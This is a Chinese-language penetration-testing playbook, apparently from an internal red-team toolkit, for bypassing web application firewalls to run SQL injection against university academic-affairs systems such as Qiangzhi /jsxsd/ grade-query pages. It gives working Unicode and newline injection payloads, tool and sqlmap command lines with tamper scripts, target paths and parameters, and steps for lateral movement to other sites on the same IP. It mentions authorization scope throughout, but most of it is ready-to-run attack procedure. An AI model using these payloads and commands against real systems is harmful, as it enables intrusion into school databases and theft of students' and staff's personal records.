# WAF 下 SQL 注入：Unicode / 换行绕过（Playbook）

工具：`炼蛊房/waf_sqli_bypass.py`  
sqlmap 旁路：`tools/vendor/03-exploit/sqlmap/tamper/charunicodeencode.py`（`%uXXXX`）  
授权：仅 `授权范围`；教务类案卷注意单站 `notes`（常见限制：自身账号数据范围）。

## 1. 心智

WAF 常按明文签名拦 `' AND 1=1`；后端/容器若对 **Java `%uXXXX` Unicode** 或 **裸换行** 二次解码，则：

| 手法 | 形态 | 作用 |
|------|------|------|
| Unicode 引号 | `2024%u0027+AND+1=1--` | `%u0027` → `'`，逃过关键字/引号规则 |
| 换行打断 | `2024%0aAND+1=1--` | `%0a`/`%0d` 拆开 WAF 正则 |
| 混合 | `%u0027%0aAND…` | 双保险 |
| 同 IP 横向 | 教务出网后扫同 C 段/同 IP 其它站 | **另需授权**；用 `origin_recon` / FOFA `ip=`，勿静默扩无关站 |

成功口径（探针）：**同一变异下 `AND 1=1` 与 `AND 1=2` 响应差分**，且非 WAF 拦截页。  
**不是**默认全库拖学生/教师/管理员——大规模拉库属高成本，先确认授权范围再做。

## 2. 教务指纹（示例路径）

强智/同类常见：`/jsxsd/`、成绩查询 `xscjcx.*.do`、参数 `xnm`（学年）`xqm`（学期）。  
会话 Cookie 名因校而异（如 `bzb_njw`）。手法通用，**域名必须在 scope**。

## 3. 自动化

```bash
# 生成变异
python3 炼蛊房/waf_sqli_bypass.py mutate --base-value 2024 --case <案卷>

# 布尔差分探针（Cookie 自行粘贴，勿写进公开文档）
python3 炼蛊房/waf_sqli_bypass.py probe \
  --url 'https://授权站/jsxsd/xscjcx.cxcxbs.do' \
  --param xnm --base-value 2024 --extra 'xqm=1' \
  --cookie 'SESS=...' --case <案卷> --insecure

# 优先只打你已验证的两类
python3 炼蛊房/waf_sqli_bypass.py probe ... \
  --only unicode_quote,newline_lf

# 探针过墙后再挂 sqlmap tamper（著译+图形解说）
python3 炼蛊房/sqlmap_kit.py cmdline \
  --url 'https://授权站/...' -p xnm --preset unicode_newline --case <案卷>
# 详见 吞库针.md
```

产物：`案卷/<案卷>/案卷/waf_sqli/probe.json`

差分 HIT 后：

```bash
python3 炼蛊房/waf_sqli_bypass.py sqlmap-hint \
  --url 'https://授权站/jsxsd/xscjcx.cxcxbs.do' --param xnm --cookie '...'

# 仓库 sqlmap
python3 tools/vendor/03-exploit/sqlmap/sqlmap.py -u '...' \
  --cookie='...' --batch --technique=B \
  --tamper=charunicodeencode,space2comment
```

换行类 sqlmap 默认弱，优先继续用本工具的 `newline_*` 手工布尔，或自写 tamper 插 `%0a`。

## 4. 与「提取任意账号」的边界

| 动作 | 何时 |
|------|------|
| mutate / probe 布尔 | 授权内默认可做 |
| 当前用户成绩/课表字段 | 通常符合「自身账号范围」notes |
| UNION/盲注拖 **全校** 师生管理员 | **先问**；核对 `scope_sites` notes；落证据要脱敏 |
| 同 IP 打其它站 | 目标进 scope 或显式扩权后再打 |

## 5. 同 IP 横向（附）

1. `dig` / FOFA `host="jw.xxx.edu.cn"` 取 A 记录  
2. `python3 炼蛊房/origin_recon.py`（若适用）  
3. 同 IP 其它 Host：`curl -k --resolve` / FOFA `ip="x.x.x.x"`  
4. **每个新 Host 先 scope**，再套同一 WAF-SQLi 探针
